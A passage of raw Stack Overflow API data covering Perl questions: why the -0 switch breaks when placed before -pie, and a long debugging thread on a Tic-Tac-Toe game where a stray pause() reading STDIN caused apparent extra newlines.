<code>-0777</code>, since <code>-0</code> treats the input as NUL-terminated lines rather than activating slurp mode.</p>\n"}], "owner": {"reputation": 3127, "user_id": 266309, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/7e67bba1d7db144687d2093e7fb201b4?s=128&d=identicon&r=PG", "display_name": "waldyrious", "link": "https://stackoverflow.com/users/266309/waldyrious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 342, "favorite_count": 0, "accepted_answer_id": 43943636, "answer_count": 1, "score": 2, "last_activity_date": 1494611776, "creation_date": 1494609776, "question_id": 43943302, "link": "https://stackoverflow.com/questions/43943302/why-does-perl-i-p0e-expression-work-but-not-perl-0-pie-expression", "title": "Why does `perl -i -p0e &lt;expression&gt;` work, but not `perl -0 -pie &lt;expression&gt;`?", "body": "<p>If I try <code>perl -pie 's/foo/bar/' file.txt</code> it works as expected: the find-replace expression is executed, and the result is saved to the original file.</p>\n\n<p>However, if I want to use the <code>-0</code> to run an expression that includes newlines, simply prepending the option doesn't work:</p>\n\n<pre><code>$ perl -0 -pie 's/foo\\nbar/qux/' file.txt\nCan't open perl script \"s/foo\\nbar/qux/\": No such file or directory\n</code></pre>\n\n<p>After several attempts, the following combination worked:</p>\n\n<pre><code>$ perl -i -p0e 's/foo\\nbar/qux/' file.txt\n</code></pre>\n\n<p>My question is: why does the first order of options produce an error (especially when plain <code>-pie</code> works as expected), while the second ordering is correctly handled?</p>\n"}, {"tags": ["perl", "for-loop"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 5, "creation_date": 1494612896, "post_id": 43943005, "comment_id": 74920882, "body": "Needs more <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617338, "post_id": 43943005, "comment_id": 74923132, "body": "<i>&quot;What do you mean &quot;what prints the &#39;|&#39; characters&quot;? print() does&quot;</i> The point is that you haven&#39;t shown the <i>code</i> that prints those characters. You don&#39;t appear to have shown the part of your program where the problem lies. <i>&quot;The entire project is only ~300 lines&quot;</i> Then just post it all if you can&#39;t reduce the code to something small that still malfunctions."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617590, "post_id": 43943005, "comment_id": 74923259, "body": "Please add this directly before your <code>for</code> loop. <code>use Data::Dumper; $Data::Dumper::Useqq = 1; print Dumper $board;</code> and report back with the result."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617744, "post_id": 43943005, "comment_id": 74923342, "body": "@Borodin The problem lies within the for loop. The if and elsif both have a call to print(), and during the same iteration, print() works as expected. I can print as much as I want and it will be on the same line. But when a full execution occurs and the loop starts over, new lines begin to show up when using print(), regardless of how much white space stripping I do."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617798, "post_id": 43943005, "comment_id": 74923370, "body": "<code>for(my $i = 0; $i &lt; length($board); $i++)</code> is generally written as <code>for my $i ( 0 .. length($board) - 1 )</code>"}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617857, "post_id": 43943005, "comment_id": 74923402, "body": "@Borodin $VAR1 = &quot;X|X|X\\n_|_|_\\n | | | &quot;;"}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617949, "post_id": 43943005, "comment_id": 74923441, "body": "@Borodin Writing the loop like that didn&#39;t fix it"}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494617987, "post_id": 43943005, "comment_id": 74923456, "body": "@Borodin I was typing that when you posted the dump code, so I didn&#39;t see it. I posted my result."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618088, "post_id": 43943005, "comment_id": 74923501, "body": "Can you leave that code in place and add <code>print Dumper $FG_RED;</code> please."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618164, "post_id": 43943005, "comment_id": 74923534, "body": "@Borodin $VAR1 = 4;"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618459, "post_id": 43943005, "comment_id": 74923676, "body": "As far as I can tell from the documentation for <code>Win32::Console</code>, you should be using <code>$CONSOLE-&gt;Write(...)</code> instead of <code>print(...)</code>. Please try that."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618660, "post_id": 43943005, "comment_id": 74923770, "body": "@Borodin Nope. That didn&#39;t do it."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618683, "post_id": 43943005, "comment_id": 74923782, "body": "Have you replaced <code>print</code> everywhere?"}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494618829, "post_id": 43943005, "comment_id": 74923842, "body": "@Borodin Yes. All of them have been replaced."}], "answers": [{"comments": [{"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494613859, "post_id": 43943914, "comment_id": 74921433, "body": "I know print() isn&#39;t supposed to append anything. That&#39;s why I&#39;m so confused as to whether the problem is with print() or the loop itself, as it only adds a new line after each iteration. I&#39;m not setting $\\ anywhere, but what should it be?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494614129, "post_id": 43943914, "comment_id": 74921586, "body": "By default, it&#39;s undef. /// If you execute <code>PrintInColor($FG_RED, &quot;a&quot;); PrintInColor($FG_RED, &quot;b&quot;);</code>, you&#39;ll see them on the same line unless you did something you didn&#39;t show."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494614461, "post_id": 43943914, "comment_id": 74921754, "body": "Yes. Printing one after the other works fine, even during the loop. It&#39;s only <b>after</b> the loop goes back to the top that there&#39;s an issue."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494614895, "post_id": 43943914, "comment_id": 74921965, "body": "You are mistaken. The existence of the loop has nothing to do with this."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494615316, "post_id": 43943914, "comment_id": 74922161, "body": "I had thought so. That&#39;s why I came here. I can&#39;t think of any reason the loop would cause this, but that&#39;s when it happens."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494617231, "post_id": 43943914, "comment_id": 74923088, "body": "Object can be destroyed at the end of the loop pass, but there are no variables scoped to your loop. So again I say, you are mistaken. The existence of the loop has nothing to do with this. Please rediagnose the problem."}], "tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 1, "last_activity_date": 1494612026, "creation_date": 1494612026, "answer_id": 43943914, "question_id": 43943005, "link": "https://stackoverflow.com/questions/43943005/perl-print-adding-newline-after-loop-iteration/43943914#43943914", "title": "Perl print() adding newline after loop iteration", "body": "<p>If <code>$board</code> doesn't contain any newlines, then you are claiming that <code>print</code> is appending newlines to what you tell it to print. By default, <code>print</code> doesn't append anything. If it's appending newlines, you must have set <code>$\\ = \"\\n\";</code> (possibly by using <code>-l</code>).</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494620613, "post_id": 43945845, "comment_id": 74924629, "body": "@DCOPTimDowd: What I&#39;ve found so far in your code is that you have multiple calls to <code>say</code>, which are the same as <code>print</code>, as you have a <code>system(&quot;cls&quot;)</code> which should be <code>$CONSOLE-&gt;Cls($FG_WHITE | $BG_BLACK)</code>."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494620685, "post_id": 43945845, "comment_id": 74924669, "body": "This example does work. Once I get it implemented into what I&#39;m doing I&#39;ll give you the green check."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494620988, "post_id": 43945845, "comment_id": 74924817, "body": "Weird. When I run your code it works fine, but when I compare ints instead of strings inside the loop, that&#39;s when it goes wrong. I added an outside counter and only changed the first if to check numbers and it no longer works. Then when I put it back it is fine again."}, {"owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494621636, "post_id": 43945845, "comment_id": 74925100, "body": "Oh my God. I figured it out. I was calling pause() every iteration, which calls &lt;STDIN&gt;. Removed that and it works great. Holy crap. Thank you for your patience. :)"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 1, "creation_date": 1494621777, "post_id": 43945845, "comment_id": 74925172, "body": "I just wrote that in my answer. Just shows you mustn&#39;t be so certain where the fault is, and show your <i>real</i> code!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494622057, "post_id": 43945845, "comment_id": 74925300, "body": "By the way, definitions like <code>my @usedXMoves = []</code> are wrong. That sets the array to contain a single element, which is a reference to an empty array. You can write <code>my @usedXMoves = ( )</code> if you must, but just <code>my @usedXMoves</code> is fine and more usual."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494622401, "post_id": 43945845, "comment_id": 74925448, "body": "@DCOPTimDowd: The same applies to the statements that are supposed to empty the arrays; <code>@usedXMoves = []</code> should be <code>@usedXMoves = ( )</code>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "edited": false, "score": 0, "creation_date": 1494622535, "post_id": 43945845, "comment_id": 74925503, "body": "@DCOPTimDowd: Note particularly that, had you not remove that <code>pause</code> call in your original post, you would have been asked what it did straight away and would have got a much quicker answer."}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 3, "last_activity_date": 1494621724, "last_edit_date": 1592644375, "creation_date": 1494620232, "answer_id": 43945845, "question_id": 43943005, "link": "https://stackoverflow.com/questions/43943005/perl-print-adding-newline-after-loop-iteration/43945845#43945845", "title": "Perl print() adding newline after loop iteration", "body": "<h3>Update</h3>\n<p>Having seen your full code I know exactly what is happening</p>\n<p>Your program has this loop</p>\n<pre><code>for my $i ( 0 .. length( $board ) - 1 ) {\n\n    if ( $i eq $currInd ) {\n        PrintInColor( $FG_RED, substr( $board, $i, 1 ) );\n        $indInd++;\n        $currInd = $winningInds[$indInd];\n    }\n    else {\n        $CONSOLE-&gt;Write( substr( $board, $i, 1 ) );\n    }\n\n    pause;\n}\n</code></pre>\n<p>where <code>pause</code> is</p>\n<pre><code>sub pause {\n    &lt;STDIN&gt;;\n}\n</code></pre>\n<p>which means you have to press <em>Return</em> to step through the loop. Each time you do that, a newline is echoed to the screen. Remove that <code>pause</code> and it will work</p>\n<br/>\n<hr />\n<p>There's no reason why the code you show should be printing newlines unless you've added them yourself elsewhere</p>\n<p>The best I can do for you is to post an example program that uses the string you say is in <code>$board</code> and displays it with the <strong>X</strong> characters in red. Note that <code>Attr()</code> doesn't <em>reset</em> the colour; you must set it back to white (or whatever) with <code>Attr($FG_WHITE)</code></p>\n<pre><code>use strict;\nuse warnings 'all';\n\nuse Win32::Console;\n\nmy $c = Win32::Console-&gt;new(STD_OUTPUT_HANDLE);\n\n$c-&gt;Cls($FG_WHITE | $BG_BLACK);\n\nmy $board = &quot;X|X|X\\n_|_|_\\n | | | &quot;;\n\nfor my $ch ( split //, $board ) {\n\n    if ( $ch eq 'X' ) {\n        $c-&gt;Attr($FG_LIGHTRED);\n        $c-&gt;Write($ch);\n        $c-&gt;Attr($FG_WHITE);\n    }\n    else {\n        $c-&gt;Write($ch);\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 167, "user_id": 6674014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/9af46c56f084518c7be4c2f1fa711191?s=128&d=identicon&r=PG", "display_name": "DCOPTimDowd", "link": "https://stackoverflow.com/users/6674014/dcoptimdowd"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 382, "favorite_count": 0, "accepted_answer_id": 43945845, "answer_count": 2, "score": -3, "last_activity_date": 1494622291, "creation_date": 1494608554, "last_edit_date": 1495540038, "question_id": 43943005, "link": "https://stackoverflow.com/questions/43943005/perl-print-adding-newline-after-loop-iteration", "title": "Perl print() adding newline after loop iteration", "body": "<p>I'm making Tic-Tac-Toe in Perl 5.24 and am working on displaying the winning move in a different color, so I'm iterating through each character in the board and using <code>print()</code> to show the characters to the screen.</p>\n\n<p>The problem I'm having is that every time the <code>for</code> loop increments, <code>print()</code> adds a newline to each character.</p>\n\n<p>I've used <a href=\"https://stackoverflow.com/a/11731939/6674014\">this</a>,\n<a href=\"https://stackoverflow.com/a/11731938/6674014\">this</a>,\n<a href=\"https://stackoverflow.com/a/11739565/6674014\">this</a>, and\n<a href=\"https://stackoverflow.com/a/12757687/6674014\">this</a> and there's still a newline, so it seems to me the issue is either with <code>print()</code> and/or how loops work in Perl.</p>\n\n<p>Here's the entire project as requested:</p>\n\n<pre><code>use 5.24.0;\nuse warnings;\nuse strict;\n\nuse Win32::Console;\n\nmy $CONSOLE = Win32::Console-&gt;new( STD_OUTPUT_HANDLE );\n\nmy $attr = $CONSOLE-&gt;Attr();\n\n$| = 1;\n\nuse constant { TRUE =&gt; 1, FALSE =&gt; 0 };\n\nuse subs qw(pause);\n\nmy $player     = \"X\";\nmy @usedXMoves = [];\nmy @usedOMoves = [];\n\nmy $xScore = 0;\nmy $oScore = 0;\n\nmy $winningMove = \"\";\n\nmy %indsToCheck = (\n    Top    =&gt; [ 0,  2,  4 ],\n    Bottom =&gt; [ 12, 14, 16 ],\n    Left   =&gt; [ 0,  6,  12 ],\n    Right  =&gt; [ 4,  10, 16 ],\n    MidV   =&gt; [ 2,  8,  14 ],\n    MidH   =&gt; [ 6,  8,  10 ],\n    DiaTB  =&gt; [ 0,  8,  16 ],\n    DiaBT  =&gt; [ 12, 8,  4 ]\n);\n\nmain();\n\nsub main {\n    my ( $gameBoard, %boardInds ) = ResetBoard();\n\n    DisplayBoardAndInds( $gameBoard, \\%boardInds );\n\n    my $res = -1;\n    while ( TRUE ) {\n        if ( -2 == $res ) {\n            DisplayScores( TRUE );\n\n            last;\n        }\n        elsif ( 1 == $res ) {\n\n            # Update score first\n            if   ( \"X\" eq $player ) { $xScore++; }\n            else                    { $oScore++; }\n\n            say \"\\n\\nWe have a winner!\\nWould you like to play again? (Y/N) \";\n            my $again = &lt;STDIN&gt;;\n            chomp $again;\n\n            if ( \"Y\" eq uc( $again ) ) {\n                ( $gameBoard, %boardInds ) = ResetBoard();\n                $res = -1;\n\n                DisplayScores();\n\n                SwitchPlayer();\n            }\n            elsif ( \"N\" eq uc( $again ) ) {\n                DisplayScores( TRUE );\n\n                last;\n            }\n        }\n        else {\n            $res = ValidateAndApplyMove( GetInput( \\%boardInds ), \\$gameBoard );\n        }\n\n        DisplayBoardAndInds( $gameBoard, \\%boardInds );\n    }\n}\n\nsub pause {\n    &lt;STDIN&gt;;\n}\n\nsub SetColor {\n    $CONSOLE-&gt;Attr( shift );\n}\n\nsub ResetColor {\n    $CONSOLE-&gt;Attr( $attr );\n}\n\n# Will display text in color\n# in: Color, text\nsub PrintInColor {\n    SetColor( shift );\n\n    $CONSOLE-&gt;Write( shift );\n\n    ResetColor();\n}\n\n# Resets the gameboard and playable indicies\nsub ResetBoard {\n    my $gameBoard = \"_|_|_\\n_|_|_\\n | | \";\n    my %boardInds = (\n        TL =&gt; 0,\n        TM =&gt; 2,\n        TR =&gt; 4,\n        ML =&gt; 6,\n        MM =&gt; 8,\n        MR =&gt; 10,\n        BL =&gt; 12,\n        BM =&gt; 14,\n        BR =&gt; 16\n    );\n\n    @usedXMoves = [];\n    @usedOMoves = [];\n\n    return ( $gameBoard, %boardInds );\n}\n\n# Displays the current board and usable moves\nsub DisplayBoardAndInds {\n    system( \"cls\" );\n\n    my $board   = shift;\n    my $refInds = shift;\n\n    if ( \"\" ne $winningMove ) {\n        my @winningInds = @{ $indsToCheck{$winningMove} };\n\n        my $indInd  = 0;\n        my $currInd = $winningInds[0];\n\n        # TODO:\n        # Figure out why new lines are being appended here\n\n        use Data::Dumper;\n\n        $Data::Dumper::Useqq = 1;\n        $CONSOLE-&gt;Write( Dumper $board);\n        $CONSOLE-&gt;Write( Dumper $FG_RED);\n        pause;\n\n        for my $i ( 0 .. length( $board ) - 1 ) {\n\n            if ( $i eq $currInd ) {\n                PrintInColor( $FG_RED, substr( $board, $i, 1 ) );\n                $indInd++;\n                $currInd = $winningInds[$indInd];\n            }\n            else {\n                $CONSOLE-&gt;Write( substr( $board, $i, 1 ) );\n\n            }\n\n            pause;\n        }\n\n        $CONSOLE-&gt;Write( \"\\n\" );\n\n        $winningMove = \"\";\n    }\n    else {\n        say $board;\n    }\n\n    say \"Current player = $player\\n\";\n\n    # Sort by value (using reference)\n    foreach my $k ( sort { $refInds-&gt;{$a} &lt;=&gt; $refInds-&gt;{$b} } keys( %$refInds ) ) {\n        $CONSOLE-&gt;Write( \"$k, \" );\n    }\n\n    $CONSOLE-&gt;Write( \"EXIT\\n\" );\n}\n\nsub DisplayScores {\n\n    system( \"cls\" );\n\n    my $final = shift;\n\n    if   ( $final ) {\n        say \"Final scores:\";\n    }\n    else            {\n        say \"Scores:\";\n    }\n\n    say \"X: $xScore\";\n    say \"O: $oScore\";\n\n    if ( $final ) {\n        say \"\\n\\nThanks for playing!\";\n    }\n\n    pause;\n}\n\n# Retrieves and validates input\nsub GetInput {\n\n    $CONSOLE-&gt;Write( \"What move would you like to make? \" );\n    my $move = &lt;STDIN&gt;;\n    chomp $move;    # &lt;STDIN&gt; returns with a newline\n    $move = uc( $move );\n\n    my $refInds = shift;\n\n    my $ret = -1;\n\n    if ( \"exit\" eq lc( $move ) ) {\n        $ret = -2;\n    }\n    if ( exists $refInds-&gt;{$move} ) {\n        $ret = $refInds-&gt;{$move};\n        delete $refInds-&gt;{$move};\n    }\n\n    return $ret;\n}\n\n# Displays any error message\n# If none, then applies the move to the board\nsub ValidateAndApplyMove {\n\n    my $move      = shift;\n    my $gameBoard = shift;\n\n    if ( -2 == $move ) {\n        return -2;\n    }\n    elsif ( -1 == $move ) {\n        say \"\\n\\nInvalid move. Please try again.\";\n        pause;\n    }\n    else {\n        my $tBoard = ${$gameBoard};\n        my $len    = length( $tBoard );\n\n        $tBoard = substr( $tBoard, 0, $move ) . $player . substr( $tBoard, $move + 1, $len );\n\n        ${$gameBoard} = $tBoard;\n\n        if ( \"X\" eq $player ) {\n            push @usedXMoves, $move;\n     